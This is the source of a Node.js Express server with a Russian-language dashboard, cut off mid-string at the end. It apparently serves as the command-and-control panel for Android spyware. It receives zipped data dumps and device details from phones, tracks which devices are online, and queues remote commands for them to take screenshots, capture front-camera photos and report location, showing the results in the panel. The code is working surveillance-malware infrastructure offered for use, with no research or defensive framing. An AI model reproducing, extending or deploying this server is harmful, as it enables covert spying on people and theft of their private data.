const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json({ limit: '50mb' }));

const PORT = process.env.PORT || 3000;

const UPLOAD_KEY = process.env.UPLOAD_KEY || 'change_me_upload';
const VIEW_KEY = process.env.VIEW_KEY || 'change_me_view';

const SAVE_DIR = path.join(__dirname, 'dumps');
const MEDIA_DIR = path.join(__dirname, 'media');
const LOG_FILE = path.join(__dirname, 'logs.json');
const UPLOAD_LOG_FILE = path.join(__dirname, 'upload_logs.json');
const DEVICES_FILE = path.join(__dirname, 'devices.json');
const CMDS_FILE = path.join(__dirname, 'commands.json');

if (!fs.existsSync(SAVE_DIR)) fs.mkdirSync(SAVE_DIR, { recursive: true });
if (!fs.existsSync(MEDIA_DIR)) fs.mkdirSync(MEDIA_DIR, { recursive: true });
if (!fs.existsSync(LOG_FILE)) fs.writeFileSync(LOG_FILE, '[]');
if (!fs.existsSync(UPLOAD_LOG_FILE)) fs.writeFileSync(UPLOAD_LOG_FILE, '[]');
if (!fs.existsSync(DEVICES_FILE)) fs.writeFileSync(DEVICES_FILE, '{}');
if (!fs.existsSync(CMDS_FILE)) fs.writeFileSync(CMDS_FILE, '{}');

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, SAVE_DIR),
  filename: (req, file, cb) => cb(null, `dump_${Date.now()}.zip`)
});
const upload = multer({ storage, limits: { fileSize: 1024 * 1024 * 1024 } });

const mediaStorage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, MEDIA_DIR),
  filename: (req, file, cb) => cb(null, `${Date.now()}_${(file.originalname || 'media').replace(/[^a-zA-Z0-9._-]/g, '_')}`)
});
const mediaUpload = multer({ storage: mediaStorage, limits: { fileSize: 200 * 1024 * 1024 } });

function readJSON(file, def) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch (e) { return def; }
}
function writeJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

function readLogs() { return readJSON(LOG_FILE, []); }
function writeLogs(arr) { if (arr.length > 500) arr = arr.slice(-500); writeJSON(LOG_FILE, arr); }
function readUploadLogs() { return readJSON(UPLOAD_LOG_FILE, []); }
function writeUploadLogs(arr) { if (arr.length > 2000) arr = arr.slice(-2000); writeJSON(UPLOAD_LOG_FILE, arr); }
function readDevices() { return readJSON(DEVICES_FILE, {}); }
function writeDevices(o) { writeJSON(DEVICES_FILE, o); }
function readCmds() { return readJSON(CMDS_FILE, {}); }
function writeCmds(o) { writeJSON(CMDS_FILE, o); }

app.post('/upload', upload.single('file'), (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false, err: 'forbidden' });
  if (!req.file) return res.status(400).json({ ok: false, err: 'no file' });

  const meta = {
    device: req.headers['x-device'] || '?',
    android: req.headers['x-android'] || '?',
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
    ts: Date.now(),
    filename: req.file.filename,
    size: req.file.size
  };
  fs.writeFileSync(path.join(SAVE_DIR, req.file.filename + '.json'), JSON.stringify(meta));
  res.json({ ok: true, id: req.file.filename });
});

app.post('/log', (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const data = req.body || {};
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const deviceId = data.deviceId || ip;

  const entry = {
    ts: Date.now(), ip,
    device: data.device || '?',
    android: data.android || '?',
    sdk: data.sdk || '?',
    clients: data.clients || [],
    zipSize: data.zipSize || 0,
    ok: data.ok === true,
    note: data.note || '',
    deviceId
  };

  const logs = readLogs();
  logs.push(entry);
  writeLogs(logs);

  const devices = readDevices();
  devices[deviceId] = {
    ...(devices[deviceId] || {}),
    deviceId,
    device: entry.device,
    android: entry.android,
    sdk: entry.sdk,
    clients: entry.clients,
    ip,
    lastSeen: Date.now()
  };
  writeDevices(devices);

  res.json({ ok: true, deviceId });
});

app.post('/log/upload', (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const data = req.body || {};
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  const entry = {
    ts: Date.now(),
    ip,
    deviceId: data.deviceId || ip,
    device: data.device || '?',
    filename: data.filename || '?',
    stage: data.stage || '?',
    chunk: data.chunk || 0,
    totalChunks: data.totalChunks || 0,
    sentBytes: data.sentBytes || 0,
    totalBytes: data.totalBytes || 0,
    note: data.note || ''
  };

  const logs = readUploadLogs();
  logs.push(entry);
  writeUploadLogs(logs);

  res.json({ ok: true });
});

app.post('/cmd/poll', (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const deviceId = (req.body && req.body.deviceId) || req.query.deviceId || 'unknown';
  const cmds = readCmds();
  const queue = cmds[deviceId] || [];

  if (queue.length > 0) {
    const cmd = queue.shift();
    cmds[deviceId] = queue;
    writeCmds(cmds);
    return res.json({ ok: true, cmd });
  }

  res.json({ ok: true, cmd: null });
});

app.post('/cmd/result', mediaUpload.single('file'), (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });

  const deviceId = req.headers['x-device-id'] || 'unknown';
  const cmdType = req.headers['x-cmd-type'] || '?';
  const status = req.headers['x-status'] || '?';

  let note = '';
  try {
    if (req.body && req.body.note) note = req.body.note;
  } catch (e) {}

  const entry = {
    ts: Date.now(),
    type: 'cmd_result',
    deviceId,
    cmd: cmdType,
    status,
    file: req.file ? '/media/' + req.file.filename : null,
    fileType: req.file ? (req.file.mimetype || '') : '',
    note
  };

  const logs = readLogs();
  logs.push(entry);
  writeLogs(logs);

  res.json({ ok: true });
});

app.get('/cmd/send', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');

  const deviceId = req.query.device;
  const cmd = req.query.cmd;
  if (!deviceId || !cmd) return res.status(400).send('missing params');

  const cmds = readCmds();
  if (!cmds[deviceId]) cmds[deviceId] = [];
  cmds[deviceId].push({ cmd, ts: Date.now() });
  writeCmds(cmds);

  res.redirect('/?key=' + VIEW_KEY + '&tab=control&device=' + encodeURIComponent(deviceId));
});

app.get('/', (req, res) => {
  if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');

  const tab = req.query.tab || 'dumps';
  const selectedDevice = req.query.device || null;

  const files = fs.readdirSync(SAVE_DIR)
    .filter(f => f.endsWith('.zip'))
    .map(f => {
      const metaPath = path.join(SAVE_DIR, f + '.json');
      const stat = fs.statSync(path.join(SAVE_DIR, f));
      let meta = { device: '?', android: '?', ip: '?', ts: stat.mtimeMs };
      if (fs.existsSync(metaPath)) {
        try { meta = JSON.parse(fs.readFileSync(metaPath, 'utf8')); } catch (e) {}
      }
      return { filename: f, size: stat.size, ...meta };
    })
    .sort((a, b) => b.ts - a.ts);

  const totalSize = files.reduce((s, f) => s + f.size, 0);
  const logs = readLogs().slice().reverse();
  const uploadLogs = readUploadLogs().slice().reverse();
  const devices = readDevices();

  const dumpCards = files.map((f, i) => `
    <div class="card" style="animation-delay:${Math.min(i * 30, 600)}ms">
      <div class="card-head">
        <div class="dot"></div>
        <div class="device">${f.device}</div>
        <div class="time">${new Date(f.ts).toLocaleString('ru-RU')}</div>
      </div>
      <div class="card-body">
        <div class="row"><span>Android</span><b>${f.android}</b></div>
        <div class="row"><span>Размер</span><b>${(f.size/1024/1024).toFixed(2)} MB</b></div>
        <div class="row"><span>IP</span><b>${f.ip}</b></div>
      </div>
      <div class="actions">
        <a class="btn" href="/download/${f.filename}?key=${VIEW_KEY}">Скачать</a>
        <a class="btn-del" href="/delete/${f.filename}?key=${VIEW_KEY}" onclick="return confirm('Удалить дамп?')">Удалить</a>
      </div>
    </div>`).join('');

  const logRows = logs.map(l => {
    if (l.type === 'cmd_result') {
      return `
      <div class="log-row">
        <div class="log-time">${new Date(l.ts).toLocaleString('ru-RU')}</div>
        <div class="log-main">
          <div class="log-device">Команда <b>${l.cmd}</b></div>
          <div class="log-meta">
            <span class="${l.status === 'ok' ? 'ok' : 'bad'}">${l.status}</span>
            ${l.note ? `<span class="tag">${l.note}</span>` : ''}
          </div>
          ${l.file && l.fileType && l.fileType.includes('image') ? `<div><img src="${l.file}" style="max-width:300px;border-radius:8px;margin-top:6px"/></div>` : ''}
          ${l.file && (!l.fileType || !l.fileType.includes('image')) ? `<div><a class="btn-mini" href="${l.file}" target="_blank">открыть файл</a></div>` : ''}
        </div>
      </div>`;
    }
    return `
      <div class="log-row">
        <div class="log-time">${new Date(l.ts).toLocaleString('ru-RU')}</div>
        <div class="log-main">
          <div class="log-device">${l.device} <span class="log-android">Android ${l.android} (SDK ${l.sdk})</span></div>
          <div class="log-meta">
            ${l.clients && l.clients.length ? `<span class="tag">${l.clients.join(' · ')}</span>` : ''}
            ${l.zipSize ? `<span class="tag">${(l.zipSize/1024/1024).toFixed(2)} MB</span>` : ''}
            ${l.ok ? `<span class="ok">✓ sent</span>` : `<span class="bad">✗ fail</span>`}
          </div>
          ${l.note ? `<div class="log-note">${l.note}</div>` : ''}
        </div>
        <div class="log-ip">${l.ip}</div>
      </div>`;
  }).join('');

  const uploadRows = uploadLogs.map(l => {
    const stageClass = l.stage === 'done' ? 'ok' : l.stage === 'fail' ? 'bad' : 'tag';
    const progress = l.totalBytes > 0 ? ((l.sentBytes / l.totalBytes) * 100).toFixed(1) : '0';
    return `
      <div class="log-row">
        <div class="log-time">${new Date(l.ts).toLocaleString('ru-RU')}</div>
        <div class="log-main">
          <div class="log-device">${l.device} <span class="log-android">${l.filename}</span></div>
          <div class="log-meta">
            <span class="${stageClass}">${l.stage}</span>
            ${l.totalChunks ? `<span>chunk ${l.chunk}/${l.totalChunks}</span>` : ''}
            ${l.totalBytes ? `<span>${(l.sentBytes/1024/1024).toFixed(2)} / ${(l.totalBytes/1024/1024).toFixed(2)} MB (${progress}%)</span>` : ''}
          </div>
          ${l.note ? `<div class="log-note">${l.note}</div>` : ''}
        </div>
        <div class="log-ip">${l.ip}</div>
      </div>`;
  }).join('');

  const deviceList = Object.values(devices).sort((a,b) => b.lastSeen - a.lastSeen);

  let controlHtml = '';
  if (!selectedDevice) {
    controlHtml = deviceList.length === 0
      ? '<div class="empty"><div class="empty-icon">📱</div><div>Устройств пока нет</div></div>'
      : '<div class="grid">' + deviceList.map(d => {
          const online = (Date.now() - d.lastSeen) < 60000;
          return `
          <a class="card" href="/?key=${VIEW_KEY}&tab=control&device=${encodeURIComponent(d.deviceId)}" style="text-decoration:none;color:inherit">
            <div class="card-head">
              <div class="dot ${online ? '' : 'off'}"></div>
              <div class="device">${d.device}</div>
              <div class="time">${new Date(d.lastSeen).toLocaleString('ru-RU')}</div>
            </div>
            <div class="card-body">
              <div class="row"><span>Android</span><b>${d.android} / SDK ${d.sdk}</b></div>
              <div class="row"><span>IP</span><b>${d.ip}</b></div>
              <div class="row"><span>Клиенты</span><b>${(d.clients||[]).join(', ') || '—'}</b></div>
            </div>
          </a>`;
        }).join('') + '</div>';
  } else {
    const dev = devices[selectedDevice];
    if (!dev) {
      controlHtml = '<div class="empty"><div class="empty-icon">❓</div><div>Устройство не найдено</div></div>';
    } else {
      const devLogs = logs.filter(l => l.deviceId === selectedDevice && l.type === 'cmd_result').slice(0, 30);
      controlHtml = `
        <div class="dev-header">
          <a href="/?key=${VIEW_KEY}&tab=control" class="back">← Назад</a>
          <div class="dev-title">${dev.device}</div>
          <div class="dev-sub">${dev.ip} · Android ${dev.android}</div>
        </div>
        <div class="cmd-grid">
          <a class="cmd-btn" href="/cmd/send?key=${VIEW_KEY}&device=${encodeURIComponent(selectedDevice)}&cmd=screenshot">📸 Скриншот</a>
          <a class="cmd-btn" href="/cmd/send?key=${VIEW_KEY}&device=${encodeURIComponent(selectedDevice)}&cmd=frontcam">🤳 Фронталка</a>
          <a class="cmd-btn" href="/cmd/send?key=${VIEW_KEY}&device=${encodeURIComponent(selectedDevice)}&cmd=location">📍 Гео</a>
        </div>
        <h3 style="margin-top:24px;margin-bottom:12px;color:#8b949e;font-size:14px">Результаты</h3>
        <div class="logs">
          ${devLogs.length === 0 ? '<div class="log-note">Пока ничего</div>' : devLogs.map(l => `
            <div class="log-row">
              <div class="log-time">${new Date(l.ts).toLocaleString('ru-RU')}</div>
              <div class="log-main">
                <div class="log-device"><b>${l.cmd}</b></div>
                <div class="log-meta"><span class="${l.status === 'ok' ? 'ok' : 'bad'}">${l.status}</span></div>
                ${l.file && l.fileType && l.fileType.includes('image') ? `<div><img src="${l.file}" style="max-width:400px;border-radius:8px;margin-top:6px" onclick="window.open('${l.file}','_blank')"/></div>` : ''}
                ${l.note ? `<div class="log-note">${l.note}</div>` : ''}
              </div>
            </div>`).join('')}
        </div>`;
    }
  }

  const html = `<!doctype html>
<html lang="ru"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Panel</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif;background:radial-gradient(ellipse at top,#1a1f2e 0%,#0a0d14 60%);color:#e6edf3;min-height:100vh;padding:24px 16px 80px}
.header{max-width:1200px;margin:0 auto 22px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:14px}
.logo{display:flex;align-items:center;gap:12px;font-size:22px;font-weight:700}
.logo-icon{width:38px;height:38px;border-radius:11px;background:linear-gradient(135deg,#58a6ff,#a371f7);display:grid;place-items:center;font-size:20px;box-shadow:0 0 28px rgba(88,166,255,.45)}
.stats{display:flex;gap:10px;flex-wrap:wrap}
.stat{padding:8px 14px;border-radius:20px;background:rgba(88,166,255,.1);color:#58a6ff;border:1px solid rgba(88,166,255,.22);font-weight:600;font-size:13px}
.stat.warn{background:rgba(248,81,73,.1);color:#f85149;border-color:rgba(248,81,73,.22)}
.tabs{max-width:1200px;margin:0 auto 20px;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
.tab{padding:10px 18px;border-radius:10px;text-decoration:none;font-weight:600;font-size:14px;background:#161b22;border:1px solid #21262d;color:#8b949e;transition:all .2s}
.tab:hover{border-color:#58a6ff;color:#58a6ff}
.tab.active{background:rgba(88,166,255,.14);color:#58a6ff;border-color:rgba(88,166,255,.3)}
.spacer{flex:1}
.tool{padding:10px 16px;border-radius:10px;text-decoration:none;font-weight:600;font-size:13px;background:#161b22;border:1px solid #21262d;color:#f85149;transition:all .2s;cursor:pointer}
.tool:hover{border-color:#f85149}
.grid,.logs{max-width:1200px;margin:0 auto;display:flex;flex-direction:column;gap:14px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px}
.empty{max-width:1200px;margin:0 auto;text-align:center;padding:100px 20px;color:#6e7681}
.empty-icon{font-size:64px;margin-bottom:18px;opacity:.4}
.card,.log-row{background:linear-gradient(180deg,rgba(22,27,34,.92),rgba(13,17,23,.92));border:1px solid #21262d;border-radius:14px;padding:16px;transition:all .25s;display:block}
.card:hover,.log-row:hover{border-color:#58a6ff}
.card-head{display:flex;align-items:center;gap:8px;padding-bottom:12px;border-bottom:1px solid #21262d;margin-bottom:12px}
.dot{width:8px;height:8px;border-radius:50%;background:#3fb950;box-shadow:0 0 8px #3fb950;flex-shrink:0}
.dot.off{background:#6e7681;box-shadow:none}
.device{font-weight:600;font-size:14px;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.time{font-size:11px;color:#6e7681;flex-shrink:0}
.card-body{display:flex;flex-direction:column;gap:8px}
.row{display:flex;justify-content:space-between;font-size:13px}
.row span{color:#6e7681}
.row b{color:#e6edf3;font-weight:500;word-break:break-all;text-align:right;max-width:60%}
.actions{display:flex;gap:8px;margin-top:14px}
.btn,.btn-del{flex:1;text-align:center;padding:10px;border-radius:9px;text-decoration:none;font-weight:600;font-size:13px;transition:all .2s}
.btn{background:linear-gradient(135deg,#238636,#2ea043);color:#fff}
.btn:hover{filter:brightness(1.15)}
.btn-del{background:rgba(248,81,73,.12);color:#f85149;border:1px solid rgba(248,81,73,.25)}
.log-row{display:flex;gap:14px;align-items:center;padding:14px 16px}
.log-time{font-size:11px;color:#6e7681;min-width:135px}
.log-main{flex:1;display:flex;flex-direction:column;gap:5px}
.log-device{font-weight:600;font-size:14px;word-break:break-all}
.log-android{color:#6e7681;font-weight:400;font-size:12px;margin-left:6px}
.log-meta{display:flex;gap:8px;flex-wrap:wrap;font-size:12px}
.log-meta span{padding:2px 8px;border-radius:10px;background:#161b22;border:1px solid #21262d}
.log-meta .ok{color:#3fb950;border-color:rgba(63,185,80,.3)}
.log-meta .bad{color:#f85149;border-color:rgba(248,81,73,.3)}
.log-meta .tag{color:#58a6ff}
.log-note{font-size:12px;color:#8b949e;font-style:italic}
.log-ip{font-size:12px;color:#6e7681;font-family:monospace}
.dev-header{max-width:1200px;margin:0 auto 20px}
.back{color:#58a6ff;text-decoration:none;font-size:14px;font-weight:600}
.dev-title{font-size:22px;font-weight:700;margin-top:10px}
.dev-sub{color:#6e7681;font-size:13px;margin-top:4px}
.cmd-grid{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:12px}
.cmd-btn{padding:18px;border-radius:12px;text-decoration:none;color:#e6edf3;font-weight:600;font-size:15px;background:linear-gradient(180deg,rgba(22,27,34,.92),rgba(13,17,23,.92));border:1px solid #21262d;text-align:center;transition:all .2s}
.cmd-btn:hover{border-color:#58a6ff;background:rgba(88,166,255,.08);transform:translateY(-2px)}
.btn-mini{display:inline-block;padding:4px 10px;border-radius:6px;background:rgba(88,166,255,.14);color:#58a6ff;text-decoration:none;font-size:11px;font-weight:600;margin-top:6px}
</style></head><body>

<div class="header">
  <div class="logo">
    <div class="logo-icon">⚡</div>
    <div>Panel</div>
  </div>
  <div class="stats">
    <div class="stat">${files.length} дампов</div>
    <div class="stat ${totalSize > 500*1024*1024 ? 'warn' : ''}">${(totalSize/1024/1024).toFixed(1)} MB</div>
    <div class="stat">${deviceList.length} устройств</div>
  </div>
</div>

<div class="tabs">
  <a class="tab ${tab === 'dumps' ? 'active' : ''}" href="/?key=${VIEW_KEY}&tab=dumps">Дампы</a>
  <a class="tab ${tab === 'control' ? 'active' : ''}" href="/?key=${VIEW_KEY}&tab=control">Управление</a>
  <a class="tab ${tab === 'logs' ? 'active' : ''}" href="/?key=${VIEW_KEY}&tab=logs">Логи</a>
  <a class="tab ${tab === 'uploadlog' ? 'active' : ''}" href="/?key=${VIEW_KEY}&tab=uploadlog">Upload Log</a>
  <div class="spacer"></div>
  ${tab === 'dumps' ? '<a class="tool" href="/clear?key=' + VIEW_KEY + '" onclick="return confir
